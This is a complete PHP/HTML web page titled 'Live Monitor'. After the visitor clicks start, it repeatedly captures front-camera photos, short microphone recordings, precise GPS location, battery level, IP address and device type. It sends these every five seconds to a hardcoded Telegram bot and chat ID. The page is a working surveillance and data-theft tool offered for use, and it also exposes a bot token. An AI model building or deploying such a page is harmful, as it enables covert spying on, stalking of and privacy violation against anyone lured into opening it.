<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
session_start();

// ========== TELEGRAM BOT SETTINGS ==========
define('BOT_TOKEN', '8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM');
define('CHAT_ID', '1634075045');

// ========== FUNCTIONS ==========
function sendToTelegram($message, $photo_data = null, $audio_data = null) {
    if (!defined('BOT_TOKEN') || empty(BOT_TOKEN)) return false;

    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_exec($ch);
    curl_close($ch);

    // Photo
    if (!empty($photo_data) && $photo_data !== 'null') {
        $base64 = $photo_data;
        if (strpos($photo_data, 'base64,') !== false) {
            $parts = explode('base64,', $photo_data);
            $base64 = $parts[1] ?? '';
        }
        $binary = base64_decode($base64, true);
        if ($binary !== false && strlen($binary) > 0) {
            $photo_url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendPhoto";
            $boundary = uniqid('p_', true);
            $body  = "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" . CHAT_ID . "\r\n";
            $body .= "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n📸 Live Photo\r\n";
            $body .= "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"photo\"; filename=\"photo.jpg\"\r\n";
            $body .= "Content-Type: image/jpeg\r\n\r\n";
            $body .= $binary . "\r\n--$boundary--\r\n";

            $ch = curl_init($photo_url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data; boundary=$boundary"]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_exec($ch);
            curl_close($ch);
        }
    }

    // Audio
    if (!empty($audio_data) && $audio_data !== 'null') {
        $base64 = $audio_data;
        if (strpos($audio_data, 'base64,') !== false) {
            $parts = explode('base64,', $audio_data);
            $base64 = $parts[1] ?? '';
        }
        $binary = base64_decode($base64, true);
        if ($binary !== false && strlen($binary) > 0) {
            $audio_url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendAudio";
            $boundary = uniqid('a_', true);
            $body  = "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" . CHAT_ID . "\r\n";
            $body .= "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"caption\"\r\n\r\n🎤 Live Audio\r\n";
            $body .= "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"audio\"; filename=\"audio.webm\"\r\n";
            $body .= "Content-Type: audio/webm\r\n\r\n";
            $body .= $binary . "\r\n--$boundary--\r\n";

            $ch = curl_init($audio_url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: multipart/form-data; boundary=$boundary"]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_exec($ch);
            curl_close($ch);
        }
    }
    return true;
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

// ========== HANDLE POST ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $action = $_POST['action'] ?? '';
    $response = ['status' => 'error', 'message' => 'Unknown'];

    if ($action === 'collect') {
        $photo   = $_POST['photo']   ?? null;
        $audio   = $_POST['audio']   ?? null;
        $lat     = $_POST['lat']     ?? 'N/A';
        $lng     = $_POST['lng']     ?? 'N/A';
        $battery = $_POST['battery'] ?? 'Unknown';
        $ip = getUserIP();
        $timestamp = date('Y-m-d H:i:s');
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

        $platform = 'Unknown';
        if (strpos($ua, 'Windows') !== false)      $platform = 'Windows';
        elseif (strpos($ua, 'Android') !== false)  $platform = 'Android';
        elseif (strpos($ua, 'iPhone') !== false)   $platform = 'iPhone';
        elseif (strpos($ua, 'Mac') !== false)      $platform = 'Mac';
        elseif (strpos($ua, 'Linux') !== false)    $platform = 'Linux';

        $msg = "🔐 LIVE DATA\n\n📸 Photo: " . (!empty($photo) ? "✅" : "❌") .
               "\n🎤 Audio: " . (!empty($audio) ? "✅" : "❌") .
               "\n🌐 IP: <code>$ip</code>\n📍 Location: $lat, $lng" .
               "\n🗺️ <a href='https://maps.google.com/?q=$lat,$lng'>Map</a>" .
               "\n🔋 Battery: $battery%\n📱 Device: $platform" .
               "\n🕐 Time: $timestamp";

        sendToTelegram($msg, $photo, $audio);
        $response = ['status' => 'ok', 'message' => 'Data sent'];
    }
    echo json_encode($response);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Live Monitor</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        min-height: 100vh;
        background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
        font-family: 'Segoe UI', system-ui, sans-serif;
        display: flex; justify-content: center; align-items: center;
        padding: 1.5rem;
    }
    .glass-card {
        background: rgba(255,255,255,0.06);
        backdrop-filter: blur(20px);
        border: 1px solid rgba(255,255,255,0.1);
        border-radius: 2rem;
        padding: 2rem 1.8rem;
        max-width: 500px; width: 100%;
        box-shadow: 0 30px 60px rgba(0,0,0,0.5);
        text-align: center;
    }
    .icon { font-size: 4rem; margin-bottom: 0.5rem; animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
    h1 {
        font-size: 1.6rem; color: #fff; font-weight: 700;
        background: linear-gradient(90deg, #00f5a0, #00d9f5);
        -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    }
    .sub { color: rgba(255,255,255,0.5); font-size: 0.85rem; margin-bottom: 1.5rem; }
    .status-area {
        background: rgba(0,0,0,0.4); border-radius: 1rem;
        padding: 1rem; margin-top: 1.5rem;
        font-size: 0.75rem; color: #00f5a0; text-align: left;
        font-family: 'Courier New', monospace;
        max-height: 200px; overflow-y: auto;
        border: 1px solid rgba(0,245,160,0.1);
        white-space: pre-wrap;
    }
    .stats-grid {
        display: grid; grid-template-columns: 1fr 1fr;
        gap: 0.5rem; margin-top: 1rem;
    }
    .stat-item {
        background: rgba(255,255,255,0.05);
        border-radius: 0.8rem; padding: 0.6rem;
    }
    .stat-label { font-size: 0.6rem; color: rgba(255,255,255,0.4); text-transform: uppercase; }
    .stat-value { font-size: 0.9rem; color: #fff; font-weight: bold; }
    button {
        margin-top:1rem; padding:0.9rem 1.5rem; border:none;
        border-radius:1rem; width:100%; font-weight:bold;
        background:linear-gradient(90deg,#00f5a0,#00d9f5);
        color:#000; cursor:pointer; font-size:1rem;
    }
    video, canvas { display: none; }
</style>
</head>
<body>

<div class="glass-card">
    <div class="icon">🕵️</div>
    <h1>Live Monitor</h1>
    <div class="sub">Real-time data collection</div>
    <div class="status-area" id="logBox">⏳ Ready...</div>
    <div class="stats-grid">
        <div class="stat-item"><div class="stat-label">📍 Location</div><div class="stat-value" id="locationStatus">⏳</div></div>
        <div class="stat-item"><div class="stat-label">🔋 Battery</div><div class="stat-value" id="batteryStatus">⏳</div></div>
        <div class="stat-item"><div class="stat-label">📸 Camera</div><div class="stat-value" id="camStatus">⏳</div></div>
        <div class="stat-item"><div class="stat-label">🎤 Mic</div><div class="stat-value" id="micStatus">⏳</div></div>
    </div>
    <button id="startBtn">▶️ START MONITORING</button>
</div>
<video id="video" autoplay muted playsinline></video>
<canvas id="canvas"></canvas>

<script>
let mediaStream=null, audioStream=null, isRunning=false, sending=false;
let loc={lat:'N/A',lng:'N/A'};
const INTERVAL=5000;

function log(m){
    const b=document.getElementById('logBox');
    b.textContent += '\n['+new Date().toLocaleTimeString()+'] '+m;
    b.scrollTop=b.scrollHeight;
}
function stat(id,v){const e=document.getElementById(id+'Status'); if(e)e.innerText=v;}
async function battery(){
    try{ if(navigator.getBattery){const b=await navigator.getBattery();return Math.round(b.level*100);} }catch(e){}
    return '?';
}
function photo(){
    try{
        const v=document.getElementById('video'), c=document.getElementById('canvas');
        if(!v||!v.videoWidth)return null;
        c.width=v.videoWidth; c.height=v.videoHeight;
        c.getContext('2d').drawImage(v,0,0);
        return c.toDataURL('image/jpeg',0.7);
    }catch(e){return null;}
}
function audio(){
    return new Promise(res=>{
        if(!audioStream)return res(null);
        try{
            const ch=[];
            const r=new MediaRecorder(audioStream,{mimeType:'audio/webm'});
            r.ondataavailable=e=>{if(e.data.size>0)ch.push(e.data);};
            r.onstop=()=>{
                if(!ch.length)return res(null);
                const blob=new Blob(ch,{type:'audio/webm'});
                const fr=new FileReader();
                fr.onload=()=>res(fr.result);
                fr.onerror=()=>res(null);
                fr.readAsDataURL(blob);
            };
            r.start();
            setTimeout(()=>{if(r.state==='recording')r.stop();},2000);
        }catch(e){res(null);}
    });
}
async function send(){
    if(sending)return;
    sending=true;
    try{
        const bat=await battery();
        const p=photo();
        const a=await audio();
        const fd=new FormData();
        fd.append('action','collect');
        fd.append('photo',p||'');
        fd.append('audio',a||'');
        fd.append('lat',loc.lat);
        fd.append('lng',loc.lng);
        fd.append('battery',bat);
        const r=await fetch(location.href,{method:'POST',body:fd});
        const j=await r.json();
        if(j.status==='ok') log('✅ Sent '+(p?'📸':'')+(a?'🎤':''));
        else log('⚠️ '+j.message);
    }catch(e){log('❌ Network error');}
    finally{
        sending=false;
        if(isRunning)setTimeout(send,INTERVAL);
    }
}
async function start(){
    if(isRunning)return;
    isRunning=true;
    document.getElementById('startBtn').style.display='none';
    log('🚀 Starting...');
    try{
        log('📸 Camera...');
        mediaStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}}});
        const v=document.getElementById('video');
        v.srcObject=mediaStream; await v.play();
        log('✅ Camera OK'); stat('cam','✅');
    }catch(e){log('❌ Camera denied'); stat('cam','❌');}
    try{
        log('🎤 Mic...');
        audioStream=await navigator.mediaDevices.getUserMedia({audio:true});
        log('✅ Mic OK'); stat('mic','✅');
    }catch(e){log('❌ Mic denied'); stat('mic','❌');}
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(
            p=>{loc={lat:p.coords.latitude.toFixed(6),lng:p.coords.longitude.toFixed(6)};
                log('✅ Loc: '+loc.lat+','+loc.lng); stat('location','✅');},
            ()=>{log('❌ Loc denied'); stat('location','❌');},
            {enableHighAccuracy:true,timeout:10000}
        );
    }
    const b=await battery(); stat('battery',b+'%');
    log('📡 Sending every '+INTERVAL/1000+'s...');
    send();
    setInterval(async()=>{const x=await battery(); stat('battery',x+'%');},10000);
}
document.getElementById('startBtn').onclick=start;
</script>
</body>
</html>